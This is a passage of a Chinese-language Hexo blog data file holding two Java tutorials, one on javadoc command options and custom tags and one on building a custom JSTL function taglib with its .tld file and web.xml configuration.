class=\"line\">  -author                          包含 @author 段</div><div class=\"line\">  -docfilessubdirs                 递归复制文档文件子目录</div><div class=\"line\">  -splitindex                      将索引分为每个字母对应一个文件</div><div class=\"line\">  -windowtitle &lt;text&gt;              文档的浏览器窗口标题</div><div class=\"line\">  -doctitle &lt;html-code&gt;            包含概览页面的标题</div><div class=\"line\">  -header &lt;html-code&gt;              包含每个页面的页眉文本</div><div class=\"line\">  -footer &lt;html-code&gt;              包含每个页面的页脚文本</div><div class=\"line\">  -top    &lt;html-code&gt;              包含每个页面的顶部文本</div><div class=\"line\">  -bottom &lt;html-code&gt;              包含每个页面的底部文本</div><div class=\"line\">  -link &lt;url&gt;                      创建指向位于 &lt;url&gt; 的 javadoc 输出的链接</div><div class=\"line\">  -linkoffline &lt;url&gt; &lt;url2&gt;        利用位于 &lt;url2&gt; 的程序包列表链接至位于 &lt;url&gt; 的文档</div><div class=\"line\">  -excludedocfilessubdir &lt;name1&gt;:.. 排除具有给定名称的所有文档文件子目录。</div><div class=\"line\">  -group &lt;name&gt; &lt;p1&gt;:&lt;p2&gt;..        在概览页面中, 将指定的程序包分组</div><div class=\"line\">  -nocomment                       不生成说明和标记, 只生成声明。</div><div class=\"line\">  -nodeprecated                    不包含 @deprecated 信息</div><div class=\"line\">  -noqualifier &lt;name1&gt;:&lt;name2&gt;:... 输出中不包括指定限定符的列表。</div><div class=\"line\">  -nosince                         不包含 @since 信息</div><div class=\"line\">  -notimestamp                     不包含隐藏时间戳</div><div class=\"line\">  -nodeprecatedlist                不生成已过时的列表</div><div class=\"line\">  -notree                          不生成类分层结构</div><div class=\"line\">  -noindex                         不生成索引</div><div class=\"line\">  -nohelp                          不生成帮助链接</div><div class=\"line\">  -nonavbar                        不生成导航栏</div><div class=\"line\">  -serialwarn                      生成有关 @serial 标记的警告</div><div class=\"line\">  -tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</div><div class=\"line\">  -taglet                          要注册的 Taglet 的全限定名称</div><div class=\"line\">  -tagletpath                      Taglet 的路径</div><div class=\"line\">  -charset &lt;charset&gt;               用于跨平台查看生成的文档的字符集。</div><div class=\"line\">  -helpfile &lt;file&gt;                 包含帮助链接所链接到的文件</div><div class=\"line\">  -linksource                      以 HTML 格式生成源文件</div><div class=\"line\">  -sourcetab &lt;tab length&gt;          指定源中每个制表符占据的空格数</div><div class=\"line\">  -keywords                        使程序包, 类和成员信息附带 HTML 元标记</div><div class=\"line\">  -stylesheetfile &lt;path&gt;           用于更改生成文档的样式的文件</div><div class=\"line\">  -docencoding &lt;name&gt;              指定输出的字符编码</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"二、命令举例\"><a href=\"#二、命令举例\" class=\"headerlink\" title=\"二、命令举例\"></a>二、命令举例</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa包及子包</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -subpackages * <span class=\"_\">-d</span> ~/doc</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa下指定子包</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util <span class=\"_\">-d</span> ~/doc</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -package <span class=\"_\">-d</span> ~/doc</div></pre></td></tr></table></figure>\n<h2 id=\"三、自定义标签\"><a href=\"#三、自定义标签\" class=\"headerlink\" title=\"三、自定义标签\"></a>三、自定义标签</h2><p>自定义标签输出到javadoc文档中，可以通过参数-tag来完成。<br>javadoc帮助文档说明如下：</p>\n<blockquote>\n<p><code>-tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</code></p>\n</blockquote>\n<p>其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。<br>另外，locations官方解释如下：</p>\n<blockquote>\n<p>Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:<br>X (disable tag)<br>a (all)<br>o (overview)<br>p (packages)<br>t (types, that is classes and interfaces)<br>c (constructors)<br>m (methods)<br>f (fields)</p>\n</blockquote>\n<p>一般地，直接使用a即可。</p>\n<h3 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">javadoc cn.yeshaoting.jvwa * -tag <span class=\"string\">\"api.name\"</span>:a:<span class=\"string\">\"接口名：\"</span> -tag <span class=\"string\">\"api.apiId\"</span>:a:<span class=\"string\">\"api id：\"</span> -tag <span class=\"string\">\"api.description\"</span>:a:<span class=\"string\">\"接口描述：\"</span> -tag <span class=\"string\">\"api.category\"</span>:a:<span class=\"string\">\"所属应用：\"</span> -tag <span class=\"string\">\"api.param\"</span>:a:<span class=\"string\">\"参数：\"</span> -tag <span class=\"string\">\"api.result\"</span>:a<span class=\"string\">\"返回结果：\"</span> -tag <span class=\"string\">\"api.requestExample\"</span>:a:<span class=\"string\">\"请求实例：\"</span> -tag <span class=\"string\">\"api.responseExample\"</span>:a:<span class=\"string\">\"响应实例：\"</span> -tag <span class=\"string\">\"api.errorExample\"</span>:a:<span class=\"string\">\"错误实例：\"</span> <span class=\"_\">-d</span> ~/doc</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：程序中标签声明形如：@api.name，@api.description，@datetime。</p>\n<h2 id=\"四、生成chm文档\"><a href=\"#四、生成chm文档\" class=\"headerlink\" title=\"四、生成chm文档\"></a>四、生成chm文档</h2><p>可参考：<a href=\"http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551\" target=\"_blank\" rel=\"external\">Javadoc转换chm帮助文档的四种方法总结</a></p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ul>\n<li><a href=\"http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html\" target=\"_blank\" rel=\"external\">如何个性化地生成Javadoc文档</a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_6e371452010177dj.html\" target=\"_blank\" rel=\"external\">如何自动生成javadoc及添加自定义标签 </a></li>\n<li><a href=\"http://blog.csdn.net/jianxin1009/article/details/35269501\" target=\"_blank\" rel=\"external\">多模块Maven项目如何使用javadoc插件生成文档</a></li>\n<li><a href=\"http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551\" target=\"_blank\" rel=\"external\">Javadoc转换chm帮助文档的四种方法总结</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、查看javadoc帮助文档\"><a href=\"#一、查看javadoc帮助文档\" class=\"headerlink\" title=\"一、查看javadoc帮助文档\"></a>一、查看javadoc帮助文档</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ javadoc --help</div><div class=\"line\">javadoc: 错误 - 无效的标记: --help</div><div class=\"line\">用法: javadoc [options] [packagenames] [sourcefiles] [@files]</div><div class=\"line\">  -overview &lt;file&gt;                 从 HTML 文件读取概览文档</div><div class=\"line\">  -public                          仅显示 public 类和成员</div><div class=\"line\">  -protected                       显示 protected/public 类和成员 (默认值)</div><div class=\"line\">  -package                         显示 package/protected/public 类和成员</div><div class=\"line\">  -private                         显示所有类和成员</div><div class=\"line\">  -help                            显示命令行选项并退出</div><div class=\"line\">  -doclet &lt;class&gt;                  通过替代 doclet 生成输出</div><div class=\"line\">  -docletpath &lt;path&gt;               指定查找 doclet 类文件的位置</div><div class=\"line\">  -sourcepath &lt;pathlist&gt;           指定查找源文件的位置</div><div class=\"line\">  -classpath &lt;pathlist&gt;            指定查找用户类文件的位置</div><div class=\"line\">  -cp &lt;pathlist&gt;                   指定查找用户类文件的位置</div><div class=\"line\">  -exclude &lt;pkglist&gt;               指定要排除的程序包列表</div><div class=\"line\">  -subpackages &lt;subpkglist&gt;        指定要递归加载的子程序包</div><div class=\"line\">  -breakiterator                   计算带有 BreakIterator 的第一个语句</div><div class=\"line\">  -bootclasspath &lt;pathlist&gt;        覆盖由引导类加载器所加载的</div><div class=\"line\">                                   类文件的位置</div><div class=\"line\">  -source &lt;release&gt;                提供与指定发行版的源兼容性</div><div class=\"line\">  -extdirs &lt;dirlist&gt;               覆盖所安装扩展的位置</div><div class=\"line\">  -verbose                         输出有关 Javadoc 正在执行的操作的信息</div><div class=\"line\">  -locale &lt;name&gt;                   要使用的区域设置, 例如 en_US 或 en_US_WIN</div><div class=\"line\">  -encoding &lt;name&gt;                 源文件编码名称</div><div class=\"line\">  -quiet                           不显示状态消息</div><div class=\"line\">  -J&lt;flag&gt;                         直接将 &lt;flag&gt; 传递到运行时系统</div><div class=\"line\">  -X                               输出非标准选项的提要</div><div class=\"line\"></div><div class=\"line\">通过标准 doclet 提供:</div><div class=\"line\">  <span class=\"_\">-d</span> &lt;directory&gt;                   输出文件的目标目录</div><div class=\"line\">  -use                             创建类和程序包用法页面</div><div class=\"line\">  -version                         包含 @version 段</div><div class=\"line\">  -author                          包含 @author 段</div><div class=\"line\">  -docfilessubdirs                 递归复制文档文件子目录</div><div class=\"line\">  -splitindex                      将索引分为每个字母对应一个文件</div><div class=\"line\">  -windowtitle &lt;text&gt;              文档的浏览器窗口标题</div><div class=\"line\">  -doctitle &lt;html-code&gt;            包含概览页面的标题</div><div class=\"line\">  -header &lt;html-code&gt;              包含每个页面的页眉文本</div><div class=\"line\">  -footer &lt;html-code&gt;              包含每个页面的页脚文本</div><div class=\"line\">  -top    &lt;html-code&gt;              包含每个页面的顶部文本</div><div class=\"line\">  -bottom &lt;html-code&gt;              包含每个页面的底部文本</div><div class=\"line\">  -link &lt;url&gt;                      创建指向位于 &lt;url&gt; 的 javadoc 输出的链接</div><div class=\"line\">  -linkoffline &lt;url&gt; &lt;url2&gt;        利用位于 &lt;url2&gt; 的程序包列表链接至位于 &lt;url&gt; 的文档</div><div class=\"line\">  -excludedocfilessubdir &lt;name1&gt;:.. 排除具有给定名称的所有文档文件子目录。</div><div class=\"line\">  -group &lt;name&gt; &lt;p1&gt;:&lt;p2&gt;..        在概览页面中, 将指定的程序包分组</div><div class=\"line\">  -nocomment                       不生成说明和标记, 只生成声明。</div><div class=\"line\">  -nodeprecated                    不包含 @deprecated 信息</div><div class=\"line\">  -noqualifier &lt;name1&gt;:&lt;name2&gt;:... 输出中不包括指定限定符的列表。</div><div class=\"line\">  -nosince                         不包含 @since 信息</div><div class=\"line\">  -notimestamp                     不包含隐藏时间戳</div><div class=\"line\">  -nodeprecatedlist                不生成已过时的列表</div><div class=\"line\">  -notree                          不生成类分层结构</div><div class=\"line\">  -noindex                         不生成索引</div><div class=\"line\">  -nohelp                          不生成帮助链接</div><div class=\"line\">  -nonavbar                        不生成导航栏</div><div class=\"line\">  -serialwarn                      生成有关 @serial 标记的警告</div><div class=\"line\">  -tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</div><div class=\"line\">  -taglet                          要注册的 Taglet 的全限定名称</div><div class=\"line\">  -tagletpath                      Taglet 的路径</div><div class=\"line\">  -charset &lt;charset&gt;               用于跨平台查看生成的文档的字符集。</div><div class=\"line\">  -helpfile &lt;file&gt;                 包含帮助链接所链接到的文件</div><div class=\"line\">  -linksource                      以 HTML 格式生成源文件</div><div class=\"line\">  -sourcetab &lt;tab length&gt;          指定源中每个制表符占据的空格数</div><div class=\"line\">  -keywords                        使程序包, 类和成员信息附带 HTML 元标记</div><div class=\"line\">  -stylesheetfile &lt;path&gt;           用于更改生成文档的样式的文件</div><div class=\"line\">  -docencoding &lt;name&gt;              指定输出的字符编码</div></pre></td></tr></table></figure>","more":"<h2 id=\"二、命令举例\"><a href=\"#二、命令举例\" class=\"headerlink\" title=\"二、命令举例\"></a>二、命令举例</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa包及子包</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -subpackages * <span class=\"_\">-d</span> ~/doc</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa下指定子包</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util <span class=\"_\">-d</span> ~/doc</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)</span></div><div class=\"line\">javadoc cn.yeshaoting.jvwa * -package <span class=\"_\">-d</span> ~/doc</div></pre></td></tr></table></figure>\n<h2 id=\"三、自定义标签\"><a href=\"#三、自定义标签\" class=\"headerlink\" title=\"三、自定义标签\"></a>三、自定义标签</h2><p>自定义标签输出到javadoc文档中，可以通过参数-tag来完成。<br>javadoc帮助文档说明如下：</p>\n<blockquote>\n<p><code>-tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</code></p>\n</blockquote>\n<p>其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。<br>另外，locations官方解释如下：</p>\n<blockquote>\n<p>Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:<br>X (disable tag)<br>a (all)<br>o (overview)<br>p (packages)<br>t (types, that is classes and interfaces)<br>c (constructors)<br>m (methods)<br>f (fields)</p>\n</blockquote>\n<p>一般地，直接使用a即可。</p>\n<h3 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">javadoc cn.yeshaoting.jvwa * -tag <span class=\"string\">\"api.name\"</span>:a:<span class=\"string\">\"接口名：\"</span> -tag <span class=\"string\">\"api.apiId\"</span>:a:<span class=\"string\">\"api id：\"</span> -tag <span class=\"string\">\"api.description\"</span>:a:<span class=\"string\">\"接口描述：\"</span> -tag <span class=\"string\">\"api.category\"</span>:a:<span class=\"string\">\"所属应用：\"</span> -tag <span class=\"string\">\"api.param\"</span>:a:<span class=\"string\">\"参数：\"</span> -tag <span class=\"string\">\"api.result\"</span>:a<span class=\"string\">\"返回结果：\"</span> -tag <span class=\"string\">\"api.requestExample\"</span>:a:<span class=\"string\">\"请求实例：\"</span> -tag <span class=\"string\">\"api.responseExample\"</span>:a:<span class=\"string\">\"响应实例：\"</span> -tag <span class=\"string\">\"api.errorExample\"</span>:a:<span class=\"string\">\"错误实例：\"</span> <span class=\"_\">-d</span> ~/doc</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：程序中标签声明形如：@api.name，@api.description，@datetime。</p>\n<h2 id=\"四、生成chm文档\"><a href=\"#四、生成chm文档\" class=\"headerlink\" title=\"四、生成chm文档\"></a>四、生成chm文档</h2><p>可参考：<a href=\"http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551\">Javadoc转换chm帮助文档的四种方法总结</a></p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ul>\n<li><a href=\"http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html\">如何个性化地生成Javadoc文档</a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_6e371452010177dj.html\">如何自动生成javadoc及添加自定义标签 </a></li>\n<li><a href=\"http://blog.csdn.net/jianxin1009/article/details/35269501\">多模块Maven项目如何使用javadoc插件生成文档</a></li>\n<li><a href=\"http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551\">Javadoc转换chm帮助文档的四种方法总结</a></li>\n</ul>"},{"title":"自定义taglib","date":"2015-12-29T07:59:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、扩展函数库\n在taglib函数类中添加需要的函数randomElement、join等。\n``` java\n/**\n * @description JSTL function ext\n * \n * @author yeshaoting\n * @date 2015-06-29 14:52:57\n */\npublic class FunctionsExt extends Functions {\n  \n  /**\n   * <pre>\n   * jstl's fn:join only works with String[]. This one is more general.\n   * \n   * usage: ${nc:join(values, \", \")}\n   * @see http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n   * </pre>\n   */\n  public static String join(Object values, String seperator) {\n    if (values == null)\n      return StringUtils.EMPTY;\n    if (values instanceof Collection<?>)\n      return StringUtils.join((Collection<?>) values, seperator);\n    else if (values instanceof Object[])\n      return StringUtils.join((Object[]) values, seperator);\n    else\n      return values.toString();\n  }\n  \n  /**\n   * get element from elementes by random\n   * \n   * @param elements\n   * @return\n   */\n  public static String randomElement(String[] elements) {\n    if (ArrayUtils.isEmpty(elements)) {\n      return StringUtils.EMPTY;\n    }\n    \n    int index = new Random().nextInt(elements.length);\n    return CollectionUtils.get(elements, index).toString();\n  }\n  \n}\n```\n\n<!-- more -->\n\n\n## 二、创建taglib fn-ext.tld\n放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld\n\n参考fn.tld内容修改：\n1. short-name改为我们自己的命令空间fnExt。\n2. uri：http://demo.martinye.com/jsp/jstl/functions-ext\n3. 定义functions，主要修改name, function-class, function-signature\n\n修改后的完整tld内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\n<taglib xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"\n  version=\"2.0\">\n\n  <description>JSTL 1.1 functions ext library</description>\n  <display-name>JSTL functions ext</display-name>\n  <tlib-version>1.1</tlib-version>\n  <short-name>fnExt</short-name>\n  <uri>http://demo.martinye.com/jsp/jstl/functions-ext</uri>\n\n  <function>\n    <description>\n      get element from elementes by random\n    </description>\n    <name>randomElement</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String randomElement(java.lang.String[])</function-signature>\n    <example>\n      &lt;c:if test=\"${fnExt:randomElement(elements)}\">\n    </example>\n  </function>\n  \n  <function>\n    <description>\n      Joins all elements of a collection into a string.\n    </description>\n    <name>join</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String join(java.lang.Object, java.lang.String)</function-signature>\n    <example>\n      ${fnExt:join(collection, \";\")}\n    </example>\n  </function>\n\n</taglib>\n```\n\n###  相关说明\n1. 函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符\n实际操作过程中，遇到不允许包含字符：`-`。\n例如：matinye-fn或者fn-ext这样的prefix都是不对的。\n**注**：有待考证。\n\n2. short-name, uri都要唯一。\n\n3. 当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。\n例如：join(array)，join(array, String)不能都同时定义在taglib中。\n\n4. 不允许使用java.util.Collection类型作为参数，使用array或者Object代替。\n**注**：有待考证。\n\n\n## 三、web.xml配置taglib\n``` xml\n  <jsp-config>\n    <taglib>\n      <taglib-uri>http://demo.martinye.com/jsp/jstl/functions-ext</taglib-uri>\n      <taglib-location>/WEB-INF/taglib/fn-ext.tld</taglib-location>\n    </taglib>\n  </jsp-config>\n```\n\n## 四、使用taglib\n\n1. jsp页面定义\n``` xml\n<%@ taglib uri=\"http://demo.martinye.com/jsp/jstl/functions-ext\" prefix=\"fnExt\"%>\n```\n\n2. 页面使用\n``` xml\n${fnExt:join(cdnServers, \" \") }<br/>\n<img src=\"http://${fnExt:randomElement(cdnServerArr) }/resources/img/logo.png\" /><br/>\n```\n\n## 五、参考文档\n[Taglib in Java: tag with array parameter][^1]\n\n\n[^1]: http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n","source":"_posts/article/java/自定义taglib.md","raw":"categories:\n  - 后端开发\ntags:\n  - taglib\n  - java\ntitle: 自定义taglib\ndate: 2015-12-29 15:59:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、扩展函数库\n在taglib函数类中添加需要的函数randomElement、join等。\n``` java\n/**\n * @description JSTL function ext\n * \n * @author yeshaoting\n * @date 2015-06-29 14:52:57\n */\npublic class FunctionsExt extends Functions {\n  \n  /**\n   * <pre>\n   * jstl's fn:join only works with String[]. This one is more general.\n   * \n   * usage: ${nc:join(values, \", \")}\n   * @see http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n   * </pre>\n   */\n  public static String join(Object values, String seperator) {\n    if (values == null)\n      return StringUtils.EMPTY;\n    if (values instanceof Collection<?>)\n      return StringUtils.join((Collection<?>) values, seperator);\n    else if (values instanceof Object[])\n      return StringUtils.join((Object[]) values, seperator);\n    else\n      return values.toString();\n  }\n  \n  /**\n   * get element from elementes by random\n   * \n   * @param elements\n   * @return\n   */\n  public static String randomElement(String[] elements) {\n    if (ArrayUtils.isEmpty(elements)) {\n      return StringUtils.EMPTY;\n    }\n    \n    int index = new Random().nextInt(elements.length);\n    return CollectionUtils.get(elements, index).toString();\n  }\n  \n}\n```\n\n<!-- more -->\n\n\n## 二、创建taglib fn-ext.tld\n放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld\n\n参考fn.tld内容修改：\n1. short-name改为我们自己的命令空间fnExt。\n2. uri：http://demo.martinye.com/jsp/jstl/functions-ext\n3. 定义functions，主要修改name, function-class, function-signature\n\n修改后的完整tld内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\n<taglib xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"\n  version=\"2.0\">\n\n  <description>JSTL 1.1 functions ext library</description>\n  <display-name>JSTL functions ext</display-name>\n  <tlib-version>1.1</tlib-version>\n  <short-name>fnExt</short-name>\n  <uri>http://demo.martinye.com/jsp/jstl/functions-ext</uri>\n\n  <function>\n    <description>\n      get element from elementes by random\n    </description>\n    <name>randomElement</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String randomElement(java.lang.String[])</function-signature>\n    <example>\n      &lt;c:if test=\"${fnExt:randomElement(elements)}\">\n    </example>\n  </function>\n  \n  <function>\n    <description>\n      Joins all elements of a collection into a string.\n    </description>\n    <name>join</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String join(java.lang.Object, java.lang.String)</function-signature>\n    <example>\n      ${fnExt:join(collection, \";\")}\n    </example>\n  </function>\n\n</taglib>\n```\n\n###  相关说明\n1. 函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符\n实际操作过程中，遇到不允许包含字符：`-`。\n例如：matinye-fn或者fn-ext这样的prefix都是不对的。\n**注**：有待考证。\n\n2. short-name, uri都要唯一。\n\n3. 当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。\n例如：join(array)，join(array, String)不能都同时定义在taglib中。\n\n4. 不允许使用java.util.Collection类型作为参数，使用array或者Object代替。\n**注**：有待考证。\n\n\n## 三、web.xml配置taglib\n``` xml\n  <jsp-config>\n    <taglib>\n      <taglib-uri>http://demo.martinye.com/jsp/jstl/functions-ext</taglib-uri>\n      <taglib-location>/WEB-INF/taglib/fn-ext.tld</taglib-location>\n    </taglib>\n  </jsp-config>\n```\n\n## 四、使用taglib\n\n1. jsp页面定义\n``` xml\n<%@ taglib uri=\"http://demo.martinye.com/jsp/jstl/functions-ext\" prefix=\"fnExt\"%>\n```\n\n2. 页面使用\n``` xml\n${fnExt:join(cdnServers, \" \") }<br/>\n<img src=\"http://${fnExt:randomElement(cdnServerArr) }/resources/img/logo.png\" /><br/>\n```\n\n## 五、参考文档\n[Taglib in Java: tag with array parameter][^1]\n\n\n[^1]: http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n","slug":"article/java/自定义taglib","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxs3003e5nbtl2z3uqzt","content":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、扩展函数库\"><a href=\"#一、扩展函数库\" class=\"headerlink\" title=\"一、扩展函数库\"></a>一、扩展函数库</h2><p>在taglib函数类中添加需要的函数randomElement、join等。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * <span class=\"doctag\">@description</span> JSTL function ext</div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-06-29 14:52:57</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FunctionsExt</span> <span class=\"keyword\">extends</span> <span class=\"title\">Functions</span> </span>&#123;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"comment\">/**</span></div><div class=\"line\">   * &lt;pre&gt;</div><div class=\"line\">   * jstl's fn:join only works with String[]. This one is more general.</div><div class=\"line\">   * </div><div class=\"line\">   * usage: $&#123;nc:join(values, \", \")&#125;</div><div class=\"line\">   * <span class=\"doctag\">@see</span> http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter</div><div class=\"line\">   * &lt;/pre&gt;</div><div class=\"line\">   */</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">join</span><span class=\"params\">(Object values, String seperator)</span> </span>&#123;</div><div class=\"line\">    <span 